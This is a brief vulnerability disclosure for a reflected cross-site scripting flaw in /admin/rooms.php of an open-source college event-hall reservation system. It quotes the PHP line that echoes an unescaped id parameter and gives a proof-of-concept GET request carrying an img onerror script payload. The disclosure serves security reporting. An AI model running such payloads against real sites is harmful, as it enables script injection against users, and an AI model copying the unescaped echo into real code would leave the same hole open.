# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS rooms.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/rooms.php

## Code
```php
<form action="rooms.php?id=<?php echo $id; ?>" method="POST" enctype="multipart/form-data"
                      autocomplete="off">
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/rooms.php?id="><img+src%3dx+onerror%3dalert("NoChizPlz")>&room_id=1 HTTP/1.1
Host: [REDACTED]
```

## Screenshot


